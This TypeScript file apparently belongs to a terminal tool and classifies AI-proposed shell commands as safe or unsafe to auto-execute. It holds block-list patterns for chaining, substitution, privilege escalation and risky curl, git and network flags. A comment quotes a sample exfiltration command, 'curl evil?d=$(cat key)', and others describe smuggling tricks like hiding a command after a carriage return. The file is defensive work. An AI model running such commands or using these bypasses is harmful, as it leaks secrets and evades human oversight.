/**
 * Command safety classifier for AI auto-execution (Whitelist layer).
 *
 * Determines whether a command is "whitelist-safe" — i.e. safe to auto-execute:
 *   1. Reject commands with dangerous shell patterns (redirections, substitutions, chaining, sudo)
 *   2. Split by pipe and evaluate each segment independently
 *   3. Each segment must be covered by the (caller-supplied) whitelist —
 *      a base-command token match, or a multi-token phrase substring match
 *   4. Check for dangerous flags on whitelisted base commands
 *
 * The whitelist is injected by the caller (managed in Settings; defaults live in
 * `commandLists.ts` as DEFAULT_WHITELIST). When in doubt, classify as unsafe.
 */

interface CommandClassification {
    safe: boolean;
    reason: string;
}

// ── Danger patterns (applied before pipe splitting) ─────────────────────────

const DANGER_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
    { pattern: /(?:^|[^|])>/, reason: 'Contains output redirection' },
    { pattern: />>/, reason: 'Contains append redirection' },
    { pattern: /(?:^|[^0-9])<(?![<=])/, reason: 'Contains input redirection' },
    { pattern: /\$\(/, reason: 'Contains command substitution $()' },
    { pattern: /`[^`]*`/, reason: 'Contains command substitution (backticks)' },
    { pattern: /(?:^|[^|]);/, reason: 'Contains command chaining (;)' },
    { pattern: /&&/, reason: 'Contains command chaining (&&)' },
    // A lone `&` (not part of `&&`) backgrounds or chains a second command, e.g.
    // `ls & poweroff` — the base command `ls` would otherwise classify safe.
    { pattern: /(?:^|[^&])&(?:[^&]|$)/, reason: 'Contains command chaining/backgrounding (&)' },
    { pattern: /\|\|/, reason: 'Contains command chaining (||)' },
    { pattern: /(?:^|\s)sudo(?:\s|$)/, reason: 'Contains privilege escalation (sudo)' },
    { pattern: /(?:^|\s)su(?:\s|$)/, reason: 'Contains privilege escalation (su)' },
    { pattern: /(?:^|\s)doas(?:\s|$)/, reason: 'Contains privilege escalation (doas)' },
];

// ── Dangerous flag rules per command ────────────────────────────────────────

interface FlagRule {
    patterns: RegExp[];
    reason: string;
}

const DANGEROUS_FLAGS: Record<string, FlagRule[]> = {
    find: [
        { patterns: [/-delete\b/], reason: 'find with -delete' },
        { patterns: [/-exec\b/], reason: 'find with -exec' },
    ],
    curl: [
        { patterns: [/-X\s*(POST|PUT|DELETE|PATCH)\b/i], reason: 'curl with write method' },
        { patterns: [/(?:^|\s)(?:-d|--data|--data-\w+)\b/], reason: 'curl with data payload' },
        { patterns: [/(?:^|\s)(?:--upload-file|-T)\b/], reason: 'curl with file upload' },
    ],
    wget: [
        { patterns: [/--post-data\b/, /--post-file\b/], reason: 'wget with POST data' },
    ],
    sed: [
        { patterns: [/(?:^|\s)-i\b/], reason: 'sed with in-place edit (-i)' },
    ],
    git: [
        { patterns: [/\b(?:push|reset|checkout|merge|rebase|rm|clean|stash)\b/], reason: 'git write operation' },
    ],
    apt: [
        { patterns: [/\b(?:install|remove|upgrade|update|purge|autoremove)\b/], reason: 'apt package modification' },
    ],
    dpkg: [
        { patterns: [/(?:^|\s)(?:-i|--install|-r|--remove|-P|--purge)\b/], reason: 'dpkg package modification' },
    ],
    rpm: [
        { patterns: [/(?:^|\s)(?:-i|--install|-e|--erase|-U|--upgrade)\b/], reason: 'rpm package modification' },
    ],
    // Read/WRITE network + kernel tools: whitelisted for their read-only queries
    // (`ip addr show`, `netsh interface show`, `sysctl -a`), but their write
    // subcommands reconfigure the box / cut the management link and must never
    // auto-execute. Reject the write verbs; anything else stays fast-path safe.
    ip: [
        { patterns: [/(?:^|\s)(?:add|del|delete|change|replace|flush|set|append|prepend)\b/], reason: 'ip write subcommand' },
    ],
    ifconfig: [
        // A bare query (`ifconfig`, `ifconfig eth0`) is safe; any config verb is not.
        { patterns: [/(?:^|\s)(?:up|down|add|del|netmask|mtu|broadcast|promisc|-promisc|arp|-arp|hw)\b/], reason: 'ifconfig interface reconfiguration' },
    ],
    route: [
        { patterns: [/(?:^|\s)(?:add|del|delete|change|flush)\b/], reason: 'route table modification' },
    ],
    arp: [
        { patterns: [/(?:^|\s)-[ds]\b/], reason: 'arp cache modification (-d/-s)' },
    ],
    netsh: [
        { patterns: [/(?:^|\s)(?:set|add|delete|reset)\b/], reason: 'netsh configuration change' },
    ],
    sysctl: [
        // `sysctl -w key=val` or `sysctl key=val` writes kernel parameters.
        { patterns: [/(?:^|\s)-w\b/, /=/], reason: 'sysctl kernel parameter write' },
    ],
    dmesg: [
        { patterns: [/(?:^|\s)(?:-c|-C|--clear|--read-clear)\b/], reason: 'dmesg ring-buffer clear' },
    ],
};

// ── Runner / interpreter commands ────────────────────────────────────────────
//
// Commands that can execute or interpret arbitrary code, or have a documented
// exec / file-write escape hatch, so a base-command whitelist can't make them
// "safe" (env <cmd>, awk 'system()', sed …e / w, find -execdir, git -c pager,
// any shell/interpreter). These never take the whitelist auto-exec fast path —
// they fall through to the AI verdict (hybrid) or a manual ask (static).
// Deliberately broad: better to ask/AI-judge once than auto-run a shell.
const RUNNER_COMMANDS: Set<string> = new Set([
    // Command runners / wrappers
    'env', 'xargs', 'nohup', 'setsid', 'stdbuf', 'nice', 'ionice', 'timeout', 'watch', 'time',
    // Interpreters
    'awk', 'gawk', 'mawk', 'sed', 'perl', 'python', 'python2', 'python3', 'ruby', 'node',
    'php', 'lua', 'tclsh', 'expect', 'osascript',
    // Shells
    'sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh', 'ash', 'pwsh', 'powershell', 'cmd', 'wsl',
    // Whitelisted read tools with exec / file-write escapes
    'find', 'git', 'set',
    // Editors / pagers that can shell out (`:!cmd`, `!cmd`, `$PAGER`)
    'vi', 'vim', 'nvim', 'emacs', 'nano', 'ed', 'less', 'more', 'man',
]);

// ── Public API ──────────────────────────────────────────────────────────────

export interface StructuralDanger {
    /** True if the command contains a floor-level dangerous shell construct. */
    danger: boolean;
    /** Which construct, for the UI (empty when `danger` is false). */
    reason: string;
}

/**
 * Structural-danger floor: whether a command contains a shell construct —
 * redirection, command substitution, chaining/backgrounding, or privilege
 * escalation — that must NEVER auto-execute, whatever a verdict rates it.
 *
 * Shared by {@link classifyCommand} (the whitelist fast-path) and the auto-exec
 * orchestrator so the AI path is gated by the same floor: a command the
 * whitelist rejects for, say, `&&` or `$(…)` can't then be auto-approved by the
 * AI verdict (an exfiltration vector like `echo ok && curl evil?d=$(cat key)`).
 *
 * Splits on CR/LF exactly like `classifyCommand` and the PTY dispatcher, so a
 * dangerous line hidden after a bare CR can't slip past the scan.
 */
export function structuralDanger(command: string): StructuralDanger {
    const lines = command
        .split(/\r\n|\r|\n/)
        .map((l) => l.trim())
        .filter((l) => l.length > 0);
    for (const line of lines) {
        for (const { pattern, reason } of DANGER_PATTERNS) {
            if (pattern.test(line)) {
                return { danger: true, reason };
            }
        }
    }
    return { danger: false, reason: '' };
}

/**
 * Classify a command as safe (auto-executable) or not, against a whitelist.
 *
 * @param command   Raw command string from AI
 * @param whitelist Caller-supplied whitelist entries (base-command tokens and/or
 *                  multi-token phrases). Defaults live in `commandLists.ts`.
 * @returns         Classification result with reason
 */
export function classifyCommand(
    command: string,
    whitelist: string[] = [],
): CommandClassification {
    const trimmed = command.trim();

    // Step 1: empty check
    if (!trimmed) {
        return { safe: false, reason: 'Empty command' };
    }

    // Split the whitelist into base-command tokens (no whitespace) and phrases.
    const tokenSet = new Set<string>();
    const phrases: string[] = [];
    for (const raw of whitelist) {
        const e = raw.trim().toLowerCase();
        if (!e) continue;
        if (/\s/.test(e)) phrases.push(e);
        else tokenSet.add(e);
    }

    // Step 1.5: multi-line handling — classify each line independently.
    // Split on CR as well as LF: a bare CR is Enter to the PTY line discipline,
    // so `ls\rshutdown` runs two commands. Splitting only on \n would let a
    // whitelisted first token shield an unlisted command hidden after the CR
    // (auto-exec bypass). The dispatcher (App.tsx) splits on the same set.
    const lines = trimmed.split(/\r\n|\r|\n/).map(l => l.trim()).filter(l => l.length > 0);
    if (lines.length > 1) {
        for (const line of lines) {
            const result = classifyCommand(line, whitelist);
            if (!result.safe) {
                return result;
            }
        }
        return { safe: true, reason: 'All commands are whitelisted' };
    }

    // Step 2: danger patterns (before pipe splitting) — structural integrity floor.
    // `trimmed` is a single line here (multi-line was handled above), so this is
    // the same shared floor the auto-exec orchestrator applies to every path.
    const danger = structuralDanger(trimmed);
    if (danger.danger) {
        return { safe: false, reason: danger.reason };
    }

    // Step 3: split by pipe and evaluate each segment
    const segments = trimmed.split('|').map(s => s.trim()).filter(Boolean);

    for (const segment of segments) {
        const result = classifySegment(segment, tokenSet, phrases);
        if (!result.safe) {
            return result;
        }
    }

    return { safe: true, reason: 'All commands are whitelisted' };
}

// ── Internal helpers ────────────────────────────────────────────────────────

function classifySegment(
    segment: string,
    tokenSet: Set<string>,
    phrases: string[],
): CommandClassification {
    const baseCommand = extractBaseCommand(segment);
    if (!baseCommand) {
        return { safe: false, reason: 'Cannot parse command' };
    }

    const baseLower = baseCommand.toLowerCase();
    const segLower = segment.toLowerCase();

    // Runner / interpreter commands have shell-exec or file-write escape hatches
    // that a base-command whitelist can't safely gate. Never auto-exec them via
    // the whitelist — defer to the AI verdict (hybrid) or a manual ask (static).
    // Checked BEFORE the whitelist so a whitelisted runner (find/git/sed/awk/env)
    // still can't take the fast path.
    if (RUNNER_COMMANDS.has(baseLower)) {
        return {
            safe: false,
            reason: `"${baseCommand}" can run arbitrary commands — needs AI/manual review`,
        };
    }

    // Whitelisted if the base command is a whitelist token …
    if (tokenSet.has(baseLower)) {
        const flagRules = DANGEROUS_FLAGS[baseLower];
        if (flagRules) {
            for (const rule of flagRules) {
                for (const pat of rule.patterns) {
                    if (pat.test(segment)) {
                        return { safe: false, reason: rule.reason };
                    }
                }
            }
        }
        return { safe: true, reason: '' };
    }

    // … or a whitelist phrase matches the segment as an anchored prefix (the
    // phrase must START the segment, on a word boundary). Anchoring prevents a
    // benign whitelisted phrase from auto-allowing any command that merely
    // CONTAINS it as a substring (e.g. `… # git log` smuggling past a `git log`
    // entry) — an auto-exec escalation vector.
    if (phrases.some((p) => segLower === p || segLower.startsWith(`${p} `))) {
        return { safe: true, reason: '' };
    }

    return { safe: false, reason: `Unknown command: ${baseCommand}` };
}

export function extractBaseCommand(segment: string): string | null {
    const trimmed = segment.trim();
    if (!trimmed) return null;

    const match = trimmed.match(/^(\S+)/);
    return match ? match[1] : null;
}
